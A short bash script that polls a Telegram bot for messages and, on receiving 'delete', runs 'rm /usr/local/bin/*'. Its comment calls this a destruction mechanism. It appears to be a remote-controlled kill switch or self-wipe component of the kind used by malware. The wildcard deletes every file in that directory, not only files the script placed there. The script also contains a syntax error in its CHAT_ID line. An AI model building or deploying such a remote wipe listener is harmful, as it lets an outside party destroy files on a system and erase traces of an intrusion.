#!/bin/bash

source /usr/local/bin/.env
CHAT_ID "-1003544348135"
API="https://api.telegram.org/bot$TELEGRAM_TOKEN"
OFFSET_FILE="$HOME/.tg_offset"

[ -f "$OFFSET_FILE" ] && OFFSET=$(cat "$OFFSET_FILE") || OFFSET=0

while true; do

    RESPONSE=$(curl -s "$API/getUpdates?offset=$OFFSET&timeout=10")

    UPDATE_ID=$(echo "$RESPONSE" | jq '.result[-1].update_id')
    MESSAGE=$(echo "$RESPONSE" | jq -r '.result[-1].message.text // empty')

    if [[ "$UPDATE_ID" != "null" ]]; then
        OFFSET=$((UPDATE_ID+1))
        echo "$OFFSET" > "$OFFSET_FILE"

        echo "Last message: $MESSAGE"

        if [[ "$MESSAGE" == "delete" ]]; then
            echo "DELETE command received"

            #if the command is "delete", remove all files we addded to /usr/local/bin(Destruction mechanism)
            rm /usr/local/bin/*
        fi
    fi

    sleep 60
done
